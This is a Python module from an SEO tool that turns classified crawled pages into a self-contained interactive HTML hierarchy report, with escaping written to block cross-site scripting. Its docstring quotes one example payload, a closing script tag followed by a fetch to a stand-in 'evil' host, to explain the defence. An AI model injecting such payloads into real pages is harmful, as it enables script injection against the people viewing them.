r"""Interactive site hierarchy report — the operator-facing output.

Per `docs/TREE_VISUALIZER_SPECIFICATION.md`. A flat CSV of 3,145 URLs is data;
a navigable tree is an audit. The difference is what a client actually sees.

Produces a **single self-contained HTML file**: no CDN, no external stylesheet,
no build step. It has to open from a filesystem, survive being emailed, and work
on a machine with no network — which rules out every convenience a bundler would
otherwise provide.

Security
--------
Every string rendered here — URLs, breadcrumb labels, topical categories —
originates from a **crawled third-party site**, which makes it attacker
controlled. A page titled `</script><script>fetch('//evil')</script>` is not
hypothetical; it is the obvious attack on any tool that renders crawl output.

Two defences, both applied unconditionally:

* All text is HTML-escaped, including quotes, before interpolation.
* The embedded JSON has `<` escaped to `\\u003c`, so a `</script>` sequence
  inside a URL cannot terminate the script block early. `json.dumps` alone does
  **not** do this, and it is the single most likely way this file could go wrong.
"""

from __future__ import annotations

import html
import json
from collections.abc import Iterable, Mapping, Sequence
from types import MappingProxyType

from src.core.logger import get_logger
from src.modules.seo.page_classifier.schemas import (
    FullPageIntelligenceProfile,
    HierarchyLevel,
    PrimaryPageType,
)

__all__ = [
    "LEVEL_ORDER",
    "PAGE_TYPE_COLOURS",
    "TreeNode",
    "build_tree",
    "render_tree_html",
]

_logger = get_logger("modules.seo.tree_visualizer")

PAGE_TYPE_COLOURS: Mapping[PrimaryPageType, str] = MappingProxyType(
    {
        PrimaryPageType.HOMEPAGE: "#00f2fe",
        PrimaryPageType.PRODUCT_CATEGORY_HUB: "#4facfe",
        PrimaryPageType.PRODUCT_DETAIL_PAGE: "#00c6ff",
        PrimaryPageType.SERVICE_CATEGORY_HUB: "#a855f7",
        PrimaryPageType.SERVICE_DETAIL_PAGE: "#c084fc",
        PrimaryPageType.BLOG_HUB: "#3b82f6",
        PrimaryPageType.BLOG_ARTICLE: "#60a5fa",
        PrimaryPageType.COMMERCIAL_LEAD_GEN: "#10b981",
        PrimaryPageType.CASE_STUDY: "#f59e0b",
        PrimaryPageType.COMPANY_ABOUT: "#38bdf8",
        PrimaryPageType.TOOL_APPLICATION: "#ec4899",
        PrimaryPageType.FACETED_FILTER: "#94a3b8",
        PrimaryPageType.UTILITY_LEGAL: "#64748b",
        PrimaryPageType.UNKNOWN: "#ef4444",
    }
)
"""Badge colours from the specification.

`UNKNOWN` is deliberately red rather than neutral: Phase 1's goal is zero of
them, so they should be visually alarming rather than blending in."""

LEVEL_ORDER: Mapping[HierarchyLevel, int] = MappingProxyType(
    {
        HierarchyLevel.L0_HOMEPAGE: 0,
        HierarchyLevel.L1_PRIMARY_NAV_HUB: 1,
        HierarchyLevel.L2_SUB_NAV_HUB: 2,
        HierarchyLevel.L3_LEAF_PAGE: 3,
        HierarchyLevel.UTILITY_PAGE: 4,
    }
)
"""Sort order. Utility pages sort last so they do not clutter the structural
view an auditor is usually reading for."""

_LEVEL_BADGE: Mapping[HierarchyLevel, str] = MappingProxyType(
    {
        HierarchyLevel.L0_HOMEPAGE: "L0",
        HierarchyLevel.L1_PRIMARY_NAV_HUB: "L1",
        HierarchyLevel.L2_SUB_NAV_HUB: "L2",
        HierarchyLevel.L3_LEAF_PAGE: "L3",
        HierarchyLevel.UTILITY_PAGE: "UTIL",
    }
)


class TreeNode:
    """One node in the rendered hierarchy.

    A plain class rather than a model: it is a transient rendering structure
    built and consumed inside this module, and a recursive Pydantic model would
    validate the entire subtree on every insertion.
    """

    def __init__(self, segment: str, path: str) -> None:
        """Create a node for one path segment."""
        self.segment = segment
        self.path = path
        self.profile: FullPageIntelligenceProfile | None = None
        self.children: dict[str, TreeNode] = {}

    @property
    def descendant_count(self) -> int:
        """Total pages beneath this node, for the rollup badge."""
        return sum(1 + child.descendant_count for child in self.children.values())

    def sorted_children(self) -> list[TreeNode]:
        """Children ordered by hierarchy level, then alphabetically."""
        return sorted(
            self.children.values(),
            key=lambda node: (
                LEVEL_ORDER.get(node.profile.hierarchy_level, 9) if node.profile else 9,
                node.segment,
            ),
        )


def _path_segments(url: str) -> list[str]:
    """Split a normalised URL into path segments, discarding scheme and host."""
    without_scheme = url.split("://", 1)[-1]
    path = without_scheme.split("/", 1)[1] if "/" in without_scheme else ""
    return [segment for segment in path.split("?", 1)[0].split("/") if segment]


def build_tree(profiles: Sequence[FullPageIntelligenceProfile]) -> TreeNode:
    """Assemble profiles into a nested hierarchy keyed by URL path.

    Structure comes from the URL path rather than `hierarchy_level`, because the
    path is what actually nests. `hierarchy_level` is a *classification* of a
    page's role and deliberately does not imply containment — an L1 hub can live
    at any path depth, which is the whole point of decoupling the two axes.

    Intermediate segments with no crawled page of their own become unlabelled
    structural nodes, so a child is never orphaned by a missing parent.

    Args:
        profiles: Classified pages, in any order.

    Returns:
        The synthetic root. Its `children` are the site's top-level sections.
    """
    root = TreeNode(segment="/", path="/")

    for profile in profiles:
        segments = _path_segments(profile.normalized_path)
        if not segments:
            root.profile = profile
            continue

        cursor = root
        accumulated = ""
        for segment in segments:
            accumulated = f"{accumulated}/{segment}"
            child = cursor.children.get(segment)
            if child is None:
                child = TreeNode(segment=segment, path=accumulated + "/")
                cursor.children[segment] = child
            cursor = child
        cursor.profile = profile

    return root


def _escape(value: str) -> str:
    """HTML-escape a crawled string, quotes included."""
    return html.escape(value, quote=True)


def _node_payload(node: TreeNode) -> dict[str, object]:
    """Project a node into the JSON the page's script consumes."""
    profile = node.profile
    return {
        "segment": node.segment,
        "path": node.path,
        "url": profile.url if profile else "",
        "level": profile.hierarchy_level.value if profile else "",
        "levelBadge": _LEVEL_BADGE.get(profile.hierarchy_level, "") if profile else "",
        "pageType": profile.primary_page_type.value if profile else "",
        "colour": PAGE_TYPE_COLOURS.get(profile.primary_page_type, "#64748b")
        if profile
        else "#334155",
        "intent": profile.search_intent.value if profile else "",
        "confidence": round(profile.final_confidence_score, 3) if profile else None,
        "method": profile.consensus_method.value if profile else "",
        "count": node.descendant_count,
        "children": [_node_payload(child) for child in node.sorted_children()],
    }


def _safe_json(payload: object) -> str:
    """Serialise for embedding inside a `<script>` block.

    Escapes `<` so a `</script>` sequence inside a crawled URL cannot terminate
    the block and inject markup. `json.dumps` does not do this by default, and
    omitting it is the most likely way this module could ship an XSS.
    """
    return (
        json.dumps(payload, ensure_ascii=False)
        .replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("&", "\\u0026")
    )


def _legend_html(used: Iterable[PrimaryPageType]) -> str:
    """Render a legend covering only the page types actually present."""
    entries = sorted(set(used), key=lambda item: item.value)
    return "".join(
        f'<span class="legend-item"><i style="background:{PAGE_TYPE_COLOURS[entry]}"></i>'
        f"{_escape(entry.value)}</span>"
        for entry in entries
    )


def render_tree_html(
    profiles: Sequence[FullPageIntelligenceProfile],
    *,
    site_name: str = "",
    subtitle: str = "",
) -> str:
    """Render a standalone interactive hierarchy report.

    Args:
        profiles: Classified pages.
        site_name: Heading text. Escaped before rendering.
        subtitle: Optional summary line, e.g. crawl statistics.

    Returns:
        A complete HTML document with no external dependencies.
    """
    tree = build_tree(profiles)
    payload = [_node_payload(child) for child in tree.sorted_children()]
    used_types = {profile.primary_page_type for profile in profiles}

    unknown = sum(1 for profile in profiles if profile.primary_page_type is PrimaryPageType.UNKNOWN)
    _logger.info(
        "tree_report_rendered",
        extra={"pages": len(profiles), "roots": len(payload), "unknown": unknown},
    )

    return _TEMPLATE.format(
        title=_escape(site_name or "Site Hierarchy"),
        subtitle=_escape(subtitle),
        total=len(profiles),
        unknown=unknown,
        # Unclassified pages are highlighted only when there are any: Phase 1's
        # goal is zero, so a red "0 unclassified" would cry wolf on a clean run.
        unknown_class="stat" if unknown else "conf",
        legend=_legend_html(used_types),
        data=_safe_json(payload),
    )


# Single-quoted CSS/JS throughout so `.format()` braces stay unambiguous; the
# literal braces the stylesheet needs are doubled.
_TEMPLATE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} — Rankuno Site Hierarchy</title>
<style>
:root {{ color-scheme: dark; }}
* {{ box-sizing: border-box; }}
body {{ margin:0; background:#0b1220; color:#e2e8f0;
  font:14px/1.5 ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif; }}
header {{ padding:20px 24px; border-bottom:1px solid #1e293b; position:sticky; top:0;
  background:#0b1220; z-index:5; }}
h1 {{ margin:0 0 4px; font-size:18px; font-weight:650; }}
.sub {{ color:#94a3b8; font-size:13px; }}
.controls {{ display:flex; gap:8px; margin-top:12px; flex-wrap:wrap; }}
button {{ background:#1e293b; color:#e2e8f0; border:1px solid #334155; border-radius:6px;
  padding:6px 12px; cursor:pointer; font-size:13px; }}
button:hover {{ background:#334155; }}
input {{ background:#0f172a; color:#e2e8f0; border:1px solid #334155; border-radius:6px;
  padding:6px 12px; font-size:13px; min-width:240px; flex:1; }}
.legend {{ display:flex; gap:12px; flex-wrap:wrap; margin-top:12px; font-size:12px;
  color:#94a3b8; }}
.legend-item {{ display:flex; align-items:center; gap:5px; }}
.legend-item i {{ width:10px; height:10px; border-radius:2px; display:inline-block; }}
main {{ padding:16px 24px 60px; }}
ul {{ list-style:none; margin:0; padding-left:20px; border-left:1px solid #1e293b; }}
li {{ margin:1px 0; }}
.row {{ display:flex; align-items:center; gap:8px; padding:3px 6px; border-radius:5px; }}
.row:hover {{ background:#111c31; }}
.tog {{ width:16px; text-align:center; cursor:pointer; color:#64748b; user-select:none; }}
.tog.leaf {{ visibility:hidden; }}
.seg {{ font-weight:550; }}
.badge {{ font-size:10px; padding:1px 6px; border-radius:10px; font-weight:650;
  letter-spacing:.03em; }}
.lvl {{ background:#1e293b; color:#94a3b8; }}
.type {{ color:#0b1220; }}
.count {{ color:#64748b; font-size:11px; }}
.conf {{ color:#475569; font-size:11px; }}
a {{ color:#7dd3fc; text-decoration:none; font-size:12px; }}
a:hover {{ text-decoration:underline; }}
.hidden {{ display:none; }}
.stat {{ color:#f87171; font-weight:600; }}
</style></head><body>
<header>
  <h1>{title}</h1>
  <div class="sub">{subtitle}</div>
  <div class="sub">{total} pages · <span class="{unknown_class}">{unknown} unclassified</span></div>
  <div class="controls">
    <button onclick="setAll(true)">Expand all</button>
    <button onclick="setAll(false)">Collapse all</button>
    <input id="q" placeholder="Filter by URL or page type…" oninput="filter(this.value)">
  </div>
  <div class="legend">{legend}</div>
</header>
<main id="tree"></main>
<script>
const DATA = {data};
// Every node is built with createElement + textContent, never innerHTML, so
// crawled strings cannot become markup even if the server-side escaping missed
// something. Defence in depth, not a substitute for it.
function node(n) {{
  const li = document.createElement('li');
  const row = document.createElement('div');
  row.className = 'row';
  const kids = n.children || [];
  const tog = document.createElement('span');
  tog.className = 'tog' + (kids.length ? '' : ' leaf');
  tog.textContent = kids.length ? '\\u25be' : '\\u2022';
  row.appendChild(tog);
  const seg = document.createElement('span');
  seg.className = 'seg';
  seg.textContent = '/' + n.segment;
  row.appendChild(seg);
  if (n.levelBadge) {{
    const b = document.createElement('span');
    b.className = 'badge lvl'; b.textContent = n.levelBadge; row.appendChild(b);
  }}
  if (n.pageType) {{
    const b = document.createElement('span');
    b.className = 'badge type'; b.style.background = n.colour; b.textContent = n.pageType;
    row.appendChild(b);
  }}
  if (n.count) {{
    const c = document.createElement('span');
    c.className = 'count'; c.textContent = n.count + ' pages'; row.appendChild(c);
  }}
  if (n.confidence !== null && n.confidence !== undefined) {{
    const c = document.createElement('span');
    c.className = 'conf'; c.textContent = n.confidence.toFixed(2) + ' · ' + n.method;
    row.appendChild(c);
  }}
  if (n.url) {{
    const a = document.createElement('a');
    a.href = n.url; a.target = '_blank'; a.rel = 'noopener noreferrer'; a.textContent = 'open';
    row.appendChild(a);
  }}
  li.appendChild(row);
  li.dataset.search = ((n.path || '') + ' ' + (n.pageType || '')).toLowerCase();
  if (kids.length) {{
    const ul = document.createElement('ul');
    kids.forEach(k => ul.appendChild(node(k)));
    li.appendChild(ul);
    tog.onclick = () => {{
      const open = !ul.classList.toggle('hidden');
      tog.textContent = open ? '\\u25be' : '\\u25b8';
    }};
  }}
  return li;
}}
const rootUl = document.createElement('ul');
DATA.forEach(n => rootUl.appendChild(node(n)));
document.getElementById('tree').appendChild(rootUl);
function setAll(open) {{
  document.querySelectorAll('#tree ul ul').forEach(u => u.classList.toggle('hidden', !open));
  document.querySelectorAll('.tog:not(.leaf)').forEach(t => {{
    t.textContent = open ? '\\u25be' : '\\u25b8';
  }});
}}
function filter(term) {{
  const q = term.trim().toLowerCase();
  document.querySelectorAll('#tree li').forEach(li => {{
    const hit = !q || (li.dataset.search || '').includes(q) ||
      li.querySelector('li[data-match="1"]') !== null;
    li.dataset.match = (!q || (li.dataset.search || '').includes(q)) ? '1' : '0';
    li.classList.toggle('hidden', !hit);
  }});
  if (q) setAll(true);
}}
</script></body></html>
"""
